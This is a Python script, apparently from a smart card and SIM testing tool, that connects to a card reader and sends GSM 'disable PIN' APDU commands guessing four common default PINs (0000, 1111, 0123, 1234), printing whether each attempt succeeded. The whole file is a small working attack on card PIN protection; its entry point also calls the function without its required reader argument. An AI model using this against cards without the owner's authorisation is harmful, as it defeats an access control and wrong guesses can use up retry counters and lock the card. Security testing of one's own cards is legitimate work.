from smartcard.System import readers
from smartcard.util import toHexString
from smartcard.Exceptions import NoCardException, NoReadersException, CardConnectionException
import sys
sys.path.insert(0, '/home/ghost/wubblegum2/wubblegum/')
from apdu_utils.file_enum import find_files_by_id, find_files_by_path, find_files_by_name, find_files_by_wordlist



def disable_pin(reader):

    #passing in reader connection and values from wubblegum
    
    connection = None
    try:
        connection = readers()[reader].createConnection()
        connection.connect()
    except IndexError:
        print("Invalid card reader number, please try --show-readers and choose one of\n"
          "the displayed options.")
        exit()
    except NoReadersException:
        print("No smart card reader found. Check that your reader is connected.")
        exit()
    except NoCardException:
        print("No smart card inserted. If you have multiple smart card readers, you may "
          "select a specific reader with the -r switch.")
        exit()

    disable_pin_cmds = [[0xA0, 0x26, 0x00, 0x01, 0x08, 0x30, 0x30, 0x30, 0x30, 0xFF, 0xFF, 0xFF, 0xFF],
                        [0xA0, 0x26, 0x00, 0x01, 0x08, 0x31, 0x31, 0x31, 0x31, 0xFF, 0xFF, 0xFF, 0xFF],
                        [0xA0, 0x26, 0x00, 0x01, 0x08, 0x30, 0x31, 0x32, 0x33, 0xFF, 0xFF, 0xFF, 0xFF],
                        [0xA0, 0x26, 0x00, 0x01, 0x08, 0x31, 0x32, 0x33, 0x34, 0xFF, 0xFF, 0xFF, 0xFF]]
    
    '''
    targeting typical default PINs. It's hex to ascii:
        0000
        1111
        0123
        1234
    '''

    i = 0

    for i in disable_pin_cmds:
        data, sw1, sw2 = connection.transmit(i)

        if sw1 == 0x90 or sw1 == 0x91 or sw1 == 0x92:
            print("\nDisable PIN was successful!: " + toHexString( i ) + "\n")
            print("sw1 = " + str(toHexString([sw1])) + ", sw2 = " + str(toHexString([sw2])) + ", data= " + str([data]))

        elif sw1 == 0x98 and sw2==0x08:
            print("\nSecurity management error: in contradiction in CHV status. Command entered: " + toHexString( i ) + "\n")
            print("sw1 = " + str(toHexString([sw1])) + ", sw2 = " + str(toHexString([sw2])))

        else: 
            print("\nDisable PIN was unsuccessful!! : " + toHexString( i ) + "\n")
            print("sw1 = " + str(toHexString([sw1])) + ", sw2 = " + str(toHexString([sw2])))
    
  

if __name__ == "__main__":
    disable_pin()
